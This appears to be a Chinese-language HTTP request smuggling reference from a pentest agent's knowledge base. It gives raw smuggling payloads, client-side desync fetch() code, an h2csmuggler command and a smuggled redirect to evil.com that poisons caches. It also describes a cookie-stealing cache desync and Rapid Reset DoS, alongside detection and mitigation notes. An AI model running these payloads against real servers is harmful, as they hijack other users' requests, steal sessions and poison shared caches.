# HTTP 请求走私专题

> CL.TE/TE.CL/TE.TE 字节级、H2 变体、CL.0/Fat GET/客户端反同步、缓存投毒链、CDN 行为矩阵。
> 基础速查见 web-vulnerabilities.md §6.1；缓存投毒详见 `$AGENT_DIR/knowledge-base/cache-poisoning.md`。

---

## 1. 经典变体（字节级）

**本质**：前端代理与后端源站对请求边界（RFC 7230 CL/chunked 帧）判定不一致 → 一个请求里夹带第二个请求。区别于 CRLF 注入（那是响应头注入）。

**CL.TE**（前端信 CL、后端信 chunked）：
```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
前端按 CL 读 13 字节（`0\r\n\r\nSMUGGLED`）结束；后端按 chunked 到 `0\r\n\r\n` 结束，`SMUGGLED` 成为下个请求起始。

**TE.CL**（前端 chunked、后端 CL）：
```http
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target
Foo: x

0

```
CL=4 只消费 chunk 长度行（`35\r\n`）；`35`hex=53 字节——改第二请求必须重算 chunk 长度；全部 CRLF。

**TE.TE 八种混淆变体**：`xchunked`｜`Transfer-Encoding : chunked`（冒号前空格）｜双重 TE｜`TE: x`｜TAB 代空格｜行首前导空格｜`X: X\nTransfer-Encoding: chunked`（行延续）｜字段名与冒号分行。枚举哪侧把哪个变体当 chunked → 映射为 CL.TE/TE.CL 打法。

## 2. HTTP/2 走私

**H2.CL**：H2 POST 的 DATA 帧含走私请求 + `content-length: 0` 头——前端整帧转发，后端见 CL:0 body 空 → 帧内余下成第二请求。确认：走私前缀 `G` 后同连接发 `GET /` → 后端见 `GGET /` 报错；时间版走私 `/sleep?delay=10`。

**H2.TE**：H2 规范禁 `transfer-encoding`，降级代理不剥即绕——DATA 帧体 `0\r\n\r\nGET /admin...` + `transfer-encoding: chunked` 头。变体：大写 TE（H2 要求小写，翻译层漏剥）、`identity`、多余空格、尾随空白。

**降级其他面**：伪头映射顺序｜禁头（Connection）透传｜重复头合并规则｜`:method`/`:path` 异常字符。

## 3. CL.0 / Fat GET / 客户端反同步

> Java 栈客户端变体: Apache HttpClient ≤4.5.9（HTTPCLIENT-1974/1978）头值 `瘍瘊`(U+760D/U+760A) 被窄化写出原生 \r\n → 请求走私（修复 4.5.10+/5.x）。详见 `ghost-bits-cast-attack.md` §4.5。

**CL.0**（无需 TE，后端忽略 CL 按 0 处理）：易感端点=未读完 body 就响应的（301/302 重定向）、静态文件服务 POST、健康检查。`POST /redirect-page` + CL:30 + body 走私 `GET /admin...` → 302 立即返回不消费 → 字节滞留污染下一请求。检测：POST 超量 body + 同连接跟进 GET，响应匹配走私路径即中。

**Fat GET**（GET 带 body）：前端转发 GET body（Nginx/Apache/HAProxy/Envoy）+ 后端忽略（Express/Gunicorn/PHP-FPM）→ 反同步。配缓存：GET 可缓存路径 + body 走私管理操作 → 响应存到缓存键下。

**CSD 客户端反同步**（毒化浏览器自身连接）：前置=连接复用 + 同站可注 JS + CL.0 型端点。
```javascript
fetch(target+'/trigger', {method:'POST', mode:'no-cors', credentials:'include',
  body:'GET /victim-data HTTP/1.1\r\nHost: target\r\n\r\n'});
fetch(target+'/api/me', {credentials:'include'});  // 响应错配读出数据
```
Pause-based 变体：声明 CL:1000 只发 50 字节，服务端超时响应后余下滞留。限制：连接复用不可靠预测、`Connection: close` 阻断。

## 4. 缓存投毒链与产品矩阵

**链**：走私请求响应错配给下一合法请求的 URL → 缓存存储 → 全用户投毒。定向：走私 `GET /redirect?url=https://evil.com/x.js` → 302 被缓存到受害者 URL。

| 产品 | 双 CL+TE | 倾向 |
|---|---|---|
| HAProxy | 转发双头 | TE |
| Nginx | 拒绝 400 | 严格难穿 |
| Apache mod_proxy | 转发 | CL（历史 CL.TE 源） |
| Cloudflare | 强规范化 | TE |
| AWS ALB/CloudFront | 规范化 | ALB 视版本；CloudFront 偏 CL 可能放过 TE 混淆 |
| Envoy/Caddy | 拒绝 400 | 极严格 |
| Varnish/Traefik | 转发 | TE |
| Squid/IIS ARR | 转发 | CL（历史源） |

H2 降级 TE 剥离：Nginx/Cloudflare/ALB/Envoy 剥；HAProxy/Traefik 可能透传。GET body：Cloudflare/Varnish 剥，HAProxy/Nginx/Apache/Envoy 转发。

## 5. 测试方法论与工具

1. 架构识别（Via/Server 头、cf-ray/x-amz-cf-id）→ 2. `curl --http2 -v` 探 ALPN → 3. 时间型 CL.TE 探针（CL:4 + 不完整 chunk → 延迟=后端在等 chunked 结束）→ 4. H2 走私（CL:0 + 前缀）→ 5. CL.0（重定向端点 + 超量 body）。

**影响升级清单**：完整请求走私？连接池化（影响他人）？可缓存端点？认证端点（绕认证）？响应反射（存储 XSS）？内部路径（提权）？CSD 可行（逐用户）？

**工具**：smuggler｜defparam｜h2csmuggler（h2c 明文）｜http2smugl｜hyper（Python H2 帧）｜smugglefuzz（走私模糊测试）｜t-reqs-http-fuzzer（语法驱动解析差异发现）｜toxicache（批量缓存投毒扫描）｜wcvs（缓存投毒漏洞扫描）｜CacheDecepHound（缓存欺骗检测）。安全注意：并发走私可毒化连接池/缓存/影响租户——授权范围、低并发、隔离环境。

**误报判断（管线伪影 vs 真走私）**：关闭连接复用重测——行为消失=客户端管线伪影；持续→H2 嵌套响应检查（body 含完整 HTTP/1 响应=确认 desync）→影响验证（投毒后新 IP/新会话验证；内部头泄露看反射；绕过看受限路径实际可达）。排干扰纪律（任何客户端）: 禁止自动改写 Content-Length/规范化换行（会破坏走私 payload 的字节精确性）; 自写脚本每连接单请求、关流水线。

## 6. h2c 走私（Upgrade Header Smuggling）

代理对 `Upgrade` 头处理不当 → 升级后进入 passthrough，不再逐请求做 ACL → 直达后端任意路径（不受 `proxy_pass` 路径限制）。

```http
GET / HTTP/1.1
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

代理脆弱性（BishopFox 2020 分类 + 2026-08 核验修正，**版本敏感用前实测**）：
- HAProxy **≥2.9.11/≥3.0.5 已修复**默认转发 h2c upgrade token（commit 7b89aa5b19）；旧版默认可利用
- Traefik：Go stdlib 反代剥离 `HTTP2-Settings` 头 → 攻击对多数 h2c 后端失败（维护方立场不受影响）
- Nuster 曾默认转发；AWS ALB/CLB、Nginx、Apache、Squid、Varnish、Kong、Envoy、ATS 需错误配置
- **不能按产品名直接判定可利用，必须实测**

利用：`python3 h2csmuggler.py -u https://target -x 'GET /admin HTTP/1.1\r\nHost: target\r\n\r\n'`。缓解识别：仅允许 `Upgrade: websocket` 或 `http-request del-header Upgrade`。

## 7. 响应队列 Desync

区别于传统走私（1.5 个请求篡改下一请求开头）：发 **2 个完整请求**，目标是错位代理的响应队列。走私请求需较长处理时间；排队期间受害者请求到达 → 受害者收到走私请求的响应（攻击者控制），攻击者后续请求收到受害者响应（窃取数据）。

**HEAD 增强**：HEAD 响应有 `Content-Length` 无 body → 代理等 body 填充 → 用下一响应内容填充。场景：内容混淆（`Content-Type: text/html` + 注入 body → XSS）、缓存投毒（错位响应被缓存）、响应分割（精确 CL 控制下一响应边界）。

## 8. 高级变体

**TE.0**（后端忽略 TE 按 body 0 处理，前端正常解析）：`Transfer-Encoding: chunked` + `0\r\n\r\n` + 走私请求，等价 TE 版 CL.0。

**Premature Upgrade Passthrough**（代理在后端确认 101 前就切 passthrough）：`Upgrade: anything` + `Content-Length: 0` + body 里放完整第二请求 → 直通后端绕过代理检查。

**TE 规范化缺陷 + close-delimited 回退**：代理检测 TE → 删 CL → 未正确解析 TE 值 → 认为无 framing → 回退 close-delimited；后端正确按 chunked → `0\r\n\r\n` 后成新请求。触发：`GET / HTTP/1.0` + `Connection: keep-alive` + `Transfer-Encoding: identity, chunked` + CL。

**Hop-by-Hop 头滥用**：`Connection: Content-Length` 声明 CL 为逐跳头（RFC 规定代理必须移除 Connection 列出的头）→ 代理删 CL，后端只见 TE → chunked 解析出走私请求。

### 缓存代理 desync: 未消费 body 复用
缓存型 TCP 代理返回缓存响应时不消费请求 body——残留字节被解析为下一请求:
```
inner = "POST /create HTTP/1.1\r\nHost: H\r\nCookie: session=attacker\r\nContent-Length: 256\r\n\r\ncontent=LEAK_"
outer = "GET /cached-page HTTP/1.1\r\nContent-Length: {len(inner)}\r\n\r\n" + inner
```
外层 GET 命中缓存 → POST body 留在连接缓冲 → admin bot 下一请求字节补齐 body → 服务端存储完整请求 → 读取提取 bot Cookie。机理是"缓存命中路径不排空 body"（区别于 CL-TE/TE-CL 的前后端长度差）。

## 9. HTTP/2 协议级攻击

**伪头注入**：`:path: /public/../admin`（代理按原始路径路由、后端规范化）｜重复 `:path`（代理取首/后端取尾）｜`:authority: public` + `host: admin.internal`（vhost 分歧）｜`:scheme: http`（后端信任 scheme 判内部→放开限制）。

**降级翻译缺陷**：H2 头值是二进制——值内 `\r\n` 降级成 H1 时变真实换行 → 头注入；TE 透传→H2.TE；代理生成 CL+攻击者自带 CL→H2.CL；大写 `Transfer-Encoding`（非法 H2）被透传成合法 H1 头绕过小写匹配过滤。

**HPACK**：压缩 oracle（猜中秘密→帧变小，受限于按连接隔离的动态表）；动态表投毒（连接池化共享表→跨请求污染）。

**单包攻击（race condition 神器）**：H2 多路复用把 N 个请求（不同 stream）打进一个 TCP 包 → 真同时到达。python-hyper h2 库：循环 send_headers/send_data 只累积，最后 `sock.sendall(conn.data_to_send())` 一次性发。打限购/余额扣减类时序敏感端点。

**DoS**：Rapid Reset（CVE-2023-44487）= HEADERS 开流→RST_STREAM 立即取消，高频循环，客户端成本远低于服务端处理成本；PRIORITY `exclusive=true + weight=256` 饿死他人流。缓解识别：SETTINGS_MAX_CONCURRENT_STREAMS 限制、RST 速率限制。

**Server Push 投毒**：push /static/app.js + 恶意内容 → 缓存到合法 URL（多数现代浏览器已禁用 push，旧环境适用）。
